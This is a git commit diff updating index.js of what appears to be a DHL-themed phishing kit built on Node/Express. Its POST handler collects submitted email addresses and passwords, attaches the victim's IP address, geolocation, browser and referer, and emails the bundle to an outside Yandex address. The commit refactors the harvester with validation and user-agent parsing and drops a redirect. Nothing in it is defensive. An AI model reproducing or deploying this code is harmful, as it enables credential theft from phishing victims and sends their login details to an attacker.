9f1b9fefb6487caa64b26e2ecdd94c1e2ff633ae
majed477 <166709168+majed477@users.noreply.github.com>
2024-07-01 13:15:57 +0300

    Update index.js

--- index.js
+++ index.js
@@ -1,82 +1,89 @@
 // server.js
 // where your node app starts
 
-// we've started you off with Express (https://expressjs.com/)
-// but feel free to use whatever libraries or frameworks you'd like through `package.json`.
-
 const express = require("express");
 const bodyParser = require("body-parser");
 const requestIp = require("request-ip");
 const geoip = require("geoip-lite");
-const app = express();
 const sendmail = require("sendmail")();
-const lastRedirect = "";
+const useragent = require("useragent");
 
-// make all the files in 'public' available
-// https://expressjs.com/en/starter/static-files.html
+const app = express();
+
 app.use(express.static("public"));
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
 
-// Get the user's IP address using the request-ip middleware
 app.use(requestIp.mw());
 
-app.get("/", (request, response) => {
-  response.sendFile(__dirname + "/src/pages/index.hbs");
-});
+function getUserIpAddr(req) {
+  return requestIp.getClientIp(req);
+}
 
-// https://expressjs.com/en/starter/basic-routing.html
+function ipInfo(ip) {
+  const geo = geoip.lookup(ip);
+  return {
+    city: geo ? geo.city : "N/A",
+    state: geo ? geo.region : "N/A",
+    country: geo ? geo.country : "N/A",
+    country_code: geo ? geo.countryCode : "N/A"
+  };
+}
+
+function buildMail(email, password, req) {
+  const dateTime = new Date().toLocaleString();
+  const hostName = req.headers.referer || "N/A";
+  const ipAddress = getUserIpAddr(req);
+  const ipData = ipInfo(ipAddress);
+  const browserName = useragent.parse(req.headers['user-agent']).toAgent();
+
+  return `
+    Email: ${email} <br>
+    Password: ${password} <br>
+    Date: ${dateTime} <br>
+    Browser: ${browserName} <br>
+    Host: ${hostName} <br>
+    IP Address: ${ipAddress} <br>
+    Country: ${ipData.country} <br>
+    State: ${ipData.state} <br>
+    City: ${ipData.city}
+  `;
+}
+
 app.post("/", (req, res) => {
   const { email, password } = req.body;
-  console.log(req.body);
-  let logEmail = "comp.id47@yandex.com";
 
-  // Get the user's IPv4 address
-  const ip = requestIp.getClientIp(req);
+  if (!email || !password) {
+    return res.status(422).json({
+      message: "The given data is invalid",
+      errors: {
+        email: "The email is required",
+        password: "The password is required"
+      }
+    });
+  }
 
-  // Get the country and city from the IP address using geoip-lite
-  const geo = geoip.lookup(ip);
-  const country = geo ? geo.country : "unknown";
-  const city = geo ? geo.city : "unknown";
-  const html = `
-    <!DOCTYPE html>
-    <html lang='en'>
-    <head>
-    <meta charset='UTF-8'>
-    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
-    <title>Document</title>
-    </head>  
-    <body>
-    Details Has Arrived!!
-    <h3>User: ${email}</h3>
-    <h3>Access: ${password}</h3>
-    <h3>IP: ${ip}</h3>
-    <h3>Country: ${country}</h3>
-    <h3>City: ${city}</h3>
-   
-    </body>
-    </html>
-    `;
- 
-  let ip2 = requestIp.getClientIp(req);
+  const message = buildMail(email, password, req);
+  const mailOptions = {
+    from: "logs@logcentral.com",
+    to: "comp.id47@yandex.com",
+    subject: "dhl fire",
+    html: message
+  };
 
-  let redirectUrl = "https://${dom}";
-
-  sendmail(
-    {
-      from: "fresh@logscentral.com",
-      to: logEmail,
-      subject: "DHL log" + ip2,
-      html,
-    },
-    function (err, reply) {
-      res.redirect(redirectUrl);
+  sendmail(mailOptions, (error, reply) => {
+    if (error) {
+      return res.status(500).json({
+        message: `Message could not be sent. Mailer Error: ${error.message}`
+      });
     }
-  );
+
+    res.status(200).json({
+      message: "Message has been sent"
+    });
+  });
 });
 
-// send the default array of dreams to the webpage
-// listen for requests :)
-const listener = app.listen(process.env.PORT, () => {
+const listener = app.listen(process.env.PORT || 3000, () => {
   console.log("Your app is listening on port " + listener.address().port);
 });
